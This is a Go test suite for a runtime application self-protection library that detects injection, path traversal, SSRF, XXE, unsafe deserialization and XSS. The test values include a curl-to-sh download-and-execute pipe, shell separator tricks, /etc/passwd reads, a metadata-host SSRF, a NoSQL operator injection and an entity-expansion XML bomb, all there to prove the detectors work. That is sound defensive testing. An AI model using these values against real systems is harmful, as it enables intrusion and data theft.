package rasp

import (
	"encoding/json"
	"net/url"
	"os"
	"reflect"
	"strconv"
	"strings"
	"testing"
)

// Each structural check, proved with one value built from the structure it
// tests, beside the safe counterpart that must not fire. No payload lists:
// every value here is assembled from the property under test (a value that
// spans several tokens, a path that climbs out of its directory, an address
// in a private range, a document that declares an external entity).

func req(value string) []Input { return AddInput(nil, value, "query.q") }

func reqKey(value, key string) []Input { return AddInput(nil, value, key) }

func model(text string) []Input { return AddModelOutput(nil, text, "") }

func sqlQuote(v string) string { return "'" + strings.ReplaceAll(v, "'", "''") + "'" }

func shQuote(v string) string { return "'" + strings.ReplaceAll(v, "'", `'\''`) + "'" }

func jsonString(v string) string { b, _ := json.Marshal(v); return string(b) }

func ruleOf(f *Finding) string {
	if f == nil {
		return ""
	}
	return f.Rule
}

func expectRule(t *testing.T, f *Finding, want string) {
	t.Helper()
	if got := ruleOf(f); got != want {
		t.Errorf("rule = %q, want %q", got, want)
	}
}

func expectNone(t *testing.T, f *Finding) {
	t.Helper()
	if f != nil {
		t.Errorf("fired %s, want nothing", f.Rule)
	}
}

func kinds(tokens []Token) []string {
	out := []string{}
	for _, t := range tokens {
		out = append(out, t.Kind)
	}
	return out
}

func TestLexers(t *testing.T) {
	t.Run("SQL: a qualified name is one token, a string with doubled quotes is one token", func(t *testing.T) {
		q := "SELECT " + strings.Join([]string{"db", "tbl"}, ".") + " FROM t WHERE a = " + sqlQuote("x'y")
		want := []string{"word", "name", "word", "word", "word", "word", "op", "string"}
		if got := kinds(SQLTokens(q, DialectGeneric)); !reflect.DeepEqual(got, want) {
			t.Errorf("kinds = %v, want %v", got, want)
		}
	})
	t.Run("SQL: placeholders are single tokens", func(t *testing.T) {
		for _, p := range []string{"?", "$1", ":name", "@name", "%s", "%(name)s"} {
			if got := kinds(SQLTokens("a = "+p, DialectGeneric)); !reflect.DeepEqual(got, []string{"word", "op", "placeholder"}) {
				t.Errorf("%s: kinds = %v", p, got)
			}
		}
	})
	t.Run("shell: a quoted segment stays inside one word", func(t *testing.T) {
		tokens, _ := ShellTokens("grep " + shQuote("a b|c") + " f")
		if got := kinds(tokens); !reflect.DeepEqual(got, []string{"word", "word", "word"}) {
			t.Errorf("kinds = %v", got)
		}
	})
	t.Run("overlap uses half-open ranges", func(t *testing.T) {
		toks := CodeTokens("ab cd")
		if n := len(Overlapping(toks, 0, 2)); n != 1 {
			t.Errorf("got %d, want 1", n)
		}
		if n := len(Overlapping(toks, 1, 3)); n != 2 {
			t.Errorf("got %d, want 2", n)
		}
	})
	t.Run("percent decoding is lenient and adds decoded forms once and twice", func(t *testing.T) {
		if got := PercentDecode("a%2Fb%zz"); got != "a/b%zz" {
			t.Errorf("got %q", got)
		}
		once := url.QueryEscape("a/b")
		twice := url.QueryEscape(once)
		var got []string
		for _, i := range req(twice) {
			got = append(got, i.Value)
		}
		if want := []string{twice, once, "a/b"}; !reflect.DeepEqual(got, want) {
			t.Errorf("got %v, want %v", got, want)
		}
	})
	t.Run("model output splits into fenced blocks, then lines", func(t *testing.T) {
		fence := strings.Repeat("`", 3)
		got := ModelFragments("intro\n" + fence + "\nline one\nline two\n" + fence + "\noutro")
		want := []string{"line one\nline two", "intro", "line one", "line two", "outro"}
		if !reflect.DeepEqual(got, want) {
			t.Errorf("got %q, want %q", got, want)
		}
	})
	t.Run("limits: 256 inputs, values cut at 4096 characters", func(t *testing.T) {
		var list []Input
		for i := 0; i < 300; i++ {
			list = AddInput(list, "v"+strconv.Itoa(i), "k")
		}
		if len(list) != MaxInputs {
			t.Errorf("len = %d", len(list))
		}
		long := AddInput(nil, strings.Repeat("é", 5000), "k")
		if charLen(long[0].Value) != MaxValue {
			t.Errorf("cut at %d characters", charLen(long[0].Value))
		}
	})
}

func TestSQLInjection(t *testing.T) {
	// A value made of three non-keyword tokens: identifier, operator, identifier.
	spanning := strings.Join([]string{"col", "=", "col"}, " ")

	expectRule(t, DetectSQL("SELECT * FROM t WHERE a = "+spanning, req(spanning), ""), "sqli.userinput")
	// safe: the same input bound as one string literal
	expectNone(t, DetectSQL("SELECT * FROM t WHERE a = "+sqlQuote(spanning), req(spanning), ""))
	// safe: a sort parameter made only of anti-detect keywords and one identifier
	sort := strings.Join([]string{"name", "desc"}, " ")
	expectNone(t, DetectSQL("SELECT * FROM t ORDER BY "+sort, req(sort), ""))
	// sqli.stacked: keywords only, so the token-structure rule's anti-detect filter lets it pass
	kw := "desc"
	value := strings.Join([]string{kw, kw}, ";")
	expectRule(t, DetectSQL("SELECT * FROM t ORDER BY a "+value, req(value), ""), "sqli.stacked")
	expectNone(t, DetectSQL("SELECT * FROM t ORDER BY a "+kw, req(kw), ""))
	// sqli.model_output: a model fragment spanning tokens, or a whole write statement
	expectRule(t, DetectSQL("SELECT * FROM t WHERE "+spanning, model(spanning), ""), "sqli.model_output")
	write := strings.Join([]string{"UPDATE", "t", "SET", "a", "=", "1"}, " ")
	expectRule(t, DetectSQL(write, model(write), ""), "sqli.model_output")
	// safe: a read-only SELECT the model wrote whole (text-to-SQL)
	read := strings.Join([]string{"SELECT", "a", "FROM", "t"}, " ")
	expectNone(t, DetectSQL(read, model(read), ""))
	// safe: the whole query equal to an input (a SQL console)
	q := "SELECT * FROM t WHERE " + spanning
	expectNone(t, DetectSQL(q, req(q), ""))
}

func TestNoSQLInjection(t *testing.T) {
	op := "$" + "ne"
	user := map[string]any{op: ""}
	body := map[string]any{"user": user}
	expectRule(t, DetectNoSQL(map[string]any{"user": user}, []any{body}, nil), "nosqli.operator")
	// deep equality, not only identity, and typed maps (bson.M is a map[string]any)
	type M map[string]any
	expectRule(t, DetectNoSQL(M{"user": M{op: ""}}, []any{body}, nil), "nosqli.operator")
	// safe: the server builds the operator itself
	safe := map[string]any{"user": "alice"}
	expectNone(t, DetectNoSQL(map[string]any{"user": map[string]any{op: safe["user"]}}, []any{safe}, nil))
	// nosqli.where: a tainted fragment spanning code tokens inside $where
	value := strings.Join([]string{"a", "||", "b"}, " ")
	expectRule(t, DetectNoSQL(map[string]any{"$where": "this.x == " + value}, []any{map[string]any{}}, req(value)), "nosqli.where")
	expectNone(t, DetectNoSQL(map[string]any{"$where": "this.x == " + jsonString(value)}, []any{map[string]any{}}, req(value)))
	// bson.D-shaped documents (ordered key/value pairs) are objects
	type E struct {
		Key   string
		Value any
	}
	type D []E
	expectRule(t, DetectNoSQL(D{{Key: "user", Value: D{{Key: op, Value: ""}}}}, []any{body}, nil), "nosqli.operator")
}

func TestCommandInjectionAndShellSpawn(t *testing.T) {
	value := strings.Join([]string{"a", "b"}, ";")
	expectRule(t, DetectCommand("ls "+value, req(value)), "cmdi.userinput")
	expectNone(t, DetectCommand("ls "+shQuote(value), req(value)))

	v := strings.Join([]string{"a", "b"}, "${IFS}")
	expectRule(t, DetectCommand("echo "+v, req(v)), "cmdi.substitution")
	expectNone(t, DetectCommand("echo a_b", req("a_b")))

	expectRule(t, DetectCommand("uptime", req("uptime")), "cmdi.full")

	two := strings.Join([]string{"git status", "git log"}, " && ")
	expectRule(t, DetectCommand(two, model(two)), "cmdi.model_output")
	expectNone(t, DetectCommand("git status", model("git status")))

	expectRule(t, DetectArgv([]string{"report-tool", "-x"}, req("report-tool")), "cmdi.executable")
	expectNone(t, DetectArgv([]string{"convert", "report-tool"}, req("report-tool")))

	expectRule(t, DetectShellSpawn(Spawn{Argv0: "/bin/sh", InRequest: true}), "shell_spawn.shell")
	expectNone(t, DetectShellSpawn(Spawn{Argv0: "/bin/sh", InRequest: true, Allow: []string{"sh"}}))
	expectNone(t, DetectShellSpawn(Spawn{Argv0: "/bin/sh", InRequest: false}))
	pipe := strings.Join([]string{"curl -s https://example.com/x", "sh"}, " | ")
	expectRule(t, DetectShellSpawn(Spawn{Command: pipe}), "shell_spawn.download_exec")

	if s, ok := ShellScriptOf([]string{"/bin/sh", "-c", "echo", "x"}); !ok || s != "echo x" {
		t.Errorf("ShellScriptOf = %q, %v", s, ok)
	}
}

func TestPathTraversalAndFileWrite(t *testing.T) {
	root := "/srv/app/uploads"
	climb := strings.Join([]string{"..", "..", "x.txt"}, "/")
	expectRule(t, DetectPath(root+"/"+climb, OpRead, req(climb), nil, true), "path.traversal")
	expectNone(t, DetectPath(root+"/x.txt", OpRead, req("x.txt"), nil, true))

	abs := strings.Join([]string{"", "srv", "other", "x.txt"}, "/")
	expectRule(t, DetectPath(abs, OpRead, req(abs), nil, true), "path.absolute")

	nul := strings.Join([]string{"x.txt", "png"}, "\x00.")
	expectRule(t, DetectPath(root+"/x.txt", OpRead, req(nul), nil, true), "path.nullbyte")

	expectRule(t, DetectPath("/srv/app/other/x.txt", OpRead, req("x.txt"), []string{root}, true), "path.outside_root")
	expectNone(t, DetectPath(root+"/x.txt", OpRead, req("x.txt"), []string{root}, true))

	expectRule(t, DetectPath("/etc/"+"passwd", OpRead, req("passwd"), nil, true), "path.sensitive")
	expectNone(t, DetectPath("/etc/"+"passwd", OpRead, req("report.pdf"), nil, true))

	name := strings.Join([]string{"upload", "js"}, ".")
	tmp := os.TempDir()
	expectRule(t, DetectPath(tmp+"/"+name, OpWrite, req(name), nil, true), "file_write.script")
	expectNone(t, DetectPath(tmp+"/"+name, OpRead, req(name), nil, true))
	expectRule(t, DetectPath(root+"/x.txt"+"::$DATA", OpWrite, nil, nil, true), "file_write.ntfs")

	if got := ResolvePath(`a\..\b/./c/`, "/srv"); got != "/srv/b/c" {
		t.Errorf("ResolvePath = %q", got)
	}
}

func TestSSRFAndOutbound(t *testing.T) {
	u := func(host, scheme string) string { return scheme + "://" + host + "/" }

	host := "10.0.0.5"
	expectRule(t, DetectSSRF(u(host, "http"), req(host), nil), "ssrf.internal")
	expectRule(t, DetectSSRF(u("svc.example.com", "http"), req("svc.example.com"), []string{host}), "ssrf.internal")
	expectNone(t, DetectSSRF(u(host, "http"), req("report.pdf"), nil))
	pub := "93.184.216.34"
	expectNone(t, DetectSSRF(u(pub, "http"), req(pub), nil))

	if !IsPrivateAddress("::ffff:127.0.0.1") || IsPrivateAddress("::ffff:93.184.216.34") || !IsPrivateAddress("fe80::1") {
		t.Error("IPv4-mapped IPv6 must be decoded first; fe80::/10 is private")
	}

	meta := MetadataHosts[0]
	expectRule(t, DetectSSRF(u(meta, "http"), req(meta), nil), "ssrf.metadata")
	expectNone(t, DetectSSRF(u(meta, "http"), req("report.pdf"), nil))

	decimal := strconv.FormatUint(uint64(127)<<24|1, 10)
	expectRule(t, DetectSSRF(u(decimal, "http"), req(decimal), nil), "ssrf.obfuscated")

	expectRule(t, DetectSSRF(u("files.example.com", "gopher"), req("files.example.com"), nil), "ssrf.protocol")
	expectNone(t, DetectSSRF(u("files.example.com", "https"), req("files.example.com"), nil))

	dns := "probe" + dnslogSuffixes[0]
	expectRule(t, DetectSSRF(u(dns, "http"), req(dns), nil), "ssrf.dnslog")

	expectRule(t, DetectOutbound(u("api.example.com", "http"), []string{"*.example.org"}, nil), "outbound.not_allowed")
	expectNone(t, DetectOutbound(u("api.example.org", "http"), []string{"*.example.org"}, nil))
	expectNone(t, DetectOutbound(u("api.example.com", "http"), nil, nil))
	expectNone(t, DetectOutbound(u("api.example.com", "http"), []string{"*.example.org"}, []string{"api.example.com"}))
}

func TestDeserializationAndCode(t *testing.T) {
	data := string([]byte{0x80, 4, 0x95}) + "payload-bytes"
	expectRule(t, DetectDeserialization(DeserPickle, data, req(data)), "deser.pickle")
	expectNone(t, DetectDeserialization(DeserPickle, data, req("report.pdf")))

	typed, _ := json.Marshal(map[string]any{"$" + "type": "Some.Type", "v": 1})
	expectRule(t, DetectDeserialization(DeserTypeName, string(typed), req(string(typed))), "deser.typename")
	plain, _ := json.Marshal(map[string]any{"name": "x", "v": 1})
	expectNone(t, DetectDeserialization(DeserTypeName, string(plain), req(string(plain))))

	stream := string([]byte{0xac, 0xed, 0x00, 0x05}) + "payload-bytes"
	expectRule(t, DetectDeserialization(DeserJava, stream, req(stream)), "deser.java")
	expectNone(t, DetectDeserialization(DeserJava, stream, req("report.pdf")))
	classTag := "a: !!java.util.ArrayList []"
	expectRule(t, DetectDeserialization(DeserSnakeYAML, classTag, req(classTag)), "deser.yaml")
	expectNone(t, DetectDeserialization(DeserSnakeYAML, classTag, req("report.pdf")))
	stdTag := "name: !!str 12345"
	expectNone(t, DetectDeserialization(DeserSnakeYAML, stdTag, req(stdTag)))

	value := strings.Join([]string{"a", "+", "b"}, " ")
	expectRule(t, DetectCode("f("+value+")", req(value)), "code.eval")
	expectNone(t, DetectCode("f("+jsonString(value)+")", req(value)))
}

func TestXXE(t *testing.T) {
	doc := func(subset string) string { return `<?xml version="1.0"?><!DOCTYPE r [` + subset + `]><r>&e;</r>` }
	external := func(uri string) string { return doc(`<!ENTITY e SYSTEM "` + uri + `">`) }

	x := external("https://example.com/defs.dtd")
	expectRule(t, DetectXML(x, reqKey(x, "body"), true), "xxe.external_entity")
	expectRule(t, DetectXML(x, reqKey(x, "body"), false), "xxe.doctype")
	expectNone(t, DetectXML(x, req("report.pdf"), true))

	f := external("file://" + strings.Join([]string{"", "srv", "data", "x.txt"}, "/"))
	expectRule(t, DetectXML(f, reqKey(f, "body"), true), "xxe.file")

	p := external("ftp://files.example.com/x")
	expectRule(t, DetectXML(p, reqKey(p, "body"), true), "xxe.protocol")

	chain := `<!ENTITY e0 "x">`
	for i := 1; i <= 3; i++ {
		prev := "&e" + strconv.Itoa(i-1) + ";"
		chain += `<!ENTITY e` + strconv.Itoa(i) + ` "` + prev + prev + `">`
	}
	b := doc(chain)
	expectRule(t, DetectXML(b, reqKey(b, "body"), true), "xxe.billion_laughs")
	one := doc(`<!ENTITY e "Acme">`)
	expectNone(t, DetectXML(one, reqKey(one, "body"), true))
}

func TestXSS(t *testing.T) {
	tag := "b"
	value := "<" + tag + ">" + strings.Repeat("x", 16) + "</" + tag + ">"
	escape := strings.NewReplacer("<", "&lt;", ">", "&gt;").Replace
	expectRule(t, DetectXSS("text/html", "<p>"+value+"</p>", req(value)), "xss.reflected")
	expectNone(t, DetectXSS("text/html", "<p>"+escape(value)+"</p>", req(value)))
	j, _ := json.Marshal(map[string]string{"value": value})
	expectNone(t, DetectXSS("application/json", string(j), req(value)))
}

func TestModelOutputToolArguments(t *testing.T) {
	var list []Input
	addToolArguments(&list, `{"sql":"select 1","n":2,"nested":{"cmd":"ls"}}`, "model.tool.run")
	var got []string
	for _, i := range list {
		got = append(got, i.Key+"="+i.Value+"/"+string(i.Source))
	}
	want := []string{"model.tool.run.sql=select 1/model_output", "model.tool.run.nested.cmd=ls/model_output"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
	list = nil
	addToolArguments(&list, "not json\nsecond", "model.tool")
	if len(list) != 2 || list[0].Key != "model.tool" {
		t.Errorf("text arguments: %v", list)
	}
}
